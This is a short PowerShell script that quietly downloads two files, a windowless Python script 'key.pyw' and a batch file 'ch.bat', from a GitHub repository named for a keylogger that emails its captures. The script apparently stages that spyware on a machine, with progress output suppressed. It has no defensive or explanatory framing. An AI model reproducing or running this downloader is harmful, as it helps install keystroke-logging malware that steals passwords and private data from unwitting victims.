$url = "https://raw.githubusercontent.com/Dipeshpal/py-keylogger-with-email/main/scripts/key.pyw"
$file = "files/key.pyw"
$ProgressPreference = "SilentlyContinue";
Invoke-WebRequest -Uri $url -outfile $file


$url = "https://raw.githubusercontent.com/Dipeshpal/py-keylogger-with-email/main/scripts/ch.bat"
$file = "files/ch.bat"
$ProgressPreference = "SilentlyContinue";
Invoke-WebRequest -Uri $url -outfile $file
